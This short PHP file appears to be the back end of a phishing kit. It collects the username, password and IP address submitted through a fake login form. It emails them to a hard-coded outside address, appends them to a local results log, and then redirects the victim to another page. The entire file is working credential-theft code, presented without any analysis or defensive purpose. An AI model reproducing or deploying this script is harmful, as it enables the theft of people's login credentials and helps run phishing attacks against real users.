<?php
$ip = getenv("REMOTE_ADDR");
$link = $_SERVER['HTTP_HOST'].$_SERVER['REQUEST_URI'] ;
$back = "index4.html";
$hostname = gethostbyaddr($ip);
$message .= "~~~~~~ Login ~~~~~~\n";
$message .= "user              : ".$_POST['username']."\n";
$message .= "pass              : ".$_POST['password']."\n";
$message .= "~~~~~~~~~ Infos ~~~~~~~~~~~\n";
$message .= "IPs              : $ip\n";
$message .= "~~~~~~~ LOGIN ~~~~~~~\n";
$send = "said.math7@outlook.fr";
$subject = "PST LOG | $ip ";
$headers .= "MIME-Version: 1.0\n";
mail($send,$subject,$message,$headers);
 
$file = fopen("../rslt/logatt.txt","a");
fwrite($file,$message); 

header("Location: $back");

?>